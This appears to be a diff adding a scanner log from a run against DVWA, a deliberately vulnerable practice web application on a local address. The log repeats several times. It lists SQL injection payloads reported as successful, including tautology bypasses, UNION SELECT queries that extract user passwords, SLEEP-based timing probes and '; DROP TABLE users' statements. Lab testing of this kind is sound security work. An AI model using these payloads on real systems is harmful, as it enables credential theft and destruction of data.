@@ -1,0 +1,207 @@
+http://192.168.64.2/dvwa/vulnerabilities/sqli/?id='
+SQL Injection found with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id='
+SQL Injection found with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id="
+SQL Injection found with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1
+SQL Injection found with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1
+SQL Injection found with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1--
+SQL Injection found with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1--
+SQL Injection found with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1' --
+SQL Injection found with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1" --
+SQL Injection found with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 'a'='a
+SQL Injection found with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=admin' --
+SQL Injection found with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1#
+SQL Injection found with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1#
+SQL Injection found with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1/*
+SQL Injection found with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1/*
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Union-based SQL Injection found with payload: ' UNION SELECT NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Second-order SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+Second-order SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id='
+SQL Injection found with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id="
+SQL Injection found with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1
+SQL Injection found with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1
+SQL Injection found with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1--
+SQL Injection found with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1--
+SQL Injection found with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1' --
+SQL Injection found with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1" --
+SQL Injection found with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 'a'='a
+SQL Injection found with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=admin' --
+SQL Injection found with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1#
+SQL Injection found with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1#
+SQL Injection found with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1/*
+SQL Injection found with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1/*
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Union-based SQL Injection found with payload: ' UNION SELECT NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Second-order SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+Second-order SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id='
+SQL Injection found with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id="
+SQL Injection found with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1
+SQL Injection found with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1
+SQL Injection found with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1--
+SQL Injection found with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1--
+SQL Injection found with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1' --
+SQL Injection found with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1" --
+SQL Injection found with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 'a'='a
+SQL Injection found with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=admin' --
+SQL Injection found with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1#
+SQL Injection found with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1#
+SQL Injection found with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1/*
+SQL Injection found with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1/*
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Union-based SQL Injection found with payload: ' UNION SELECT NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Second-order SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+Second-order SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR '1'='1 in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR "1"="1 in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR '1'='1' -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR "1"="1" -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 'a'='a in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: admin' -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1# in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1# in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1/* in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1/* in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' AND SLEEP(5)-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " AND SLEEP(5)-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: '; DROP TABLE users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: "; DROP TABLE users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR '1'='1 in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR "1"="1 in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR '1'='1' -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR "1"="1" -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 'a'='a in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: admin' -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1# in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1# in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1/* in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1/* in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' AND SLEEP(5)-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " AND SLEEP(5)-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: '; DROP TABLE users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: "; DROP TABLE users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR '1'='1 in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR "1"="1 in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR '1'='1' -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR "1"="1" -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 'a'='a in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: admin' -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1# in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1# in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' OR 1=1/* in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " OR 1=1/* in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: ' AND SLEEP(5)-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: " AND SLEEP(5)-- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: '; DROP TABLE users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found with payload: "; DROP TABLE users -- in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+http://192.168.64.2/dvwa/vulnerabilities/sqli/?id='
+SQL Injection found with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id='
+SQL Injection found with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id="
+SQL Injection found with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1
+SQL Injection found with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1
+SQL Injection found with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1--
+SQL Injection found with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1--
+SQL Injection found with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR '1'='1' --
+SQL Injection found with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR "1"="1" --
+SQL Injection found with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 'a'='a
+SQL Injection found with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=admin' --
+SQL Injection found with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1#
+SQL Injection found with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1#
+SQL Injection found with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' OR 1=1/*
+SQL Injection found with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=" OR 1=1/*
+SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Union-based SQL Injection found with payload: ' UNION SELECT NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT NULL, NULL, NULL, NULL-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT NULL, NULL, NULL, NULL--
+Union-based SQL Injection found with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/?id=' UNION SELECT user, password FROM users --
+Second-order SQL Injection found with payload: ' in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+Second-order SQL Injection found with payload: " in form at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1 at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1-- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR '1'='1' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR "1"="1" -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 'a'='a at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: admin' -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1# at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: " OR 1=1/* at http://192.168.64.2/dvwa/vulnerabilities/sqli/
+SQL Injection found in form with payload: ' UNION SELECT user, password FROM users -- at http://192.168.64.2/dvwa/vulnerabilities/sqli/
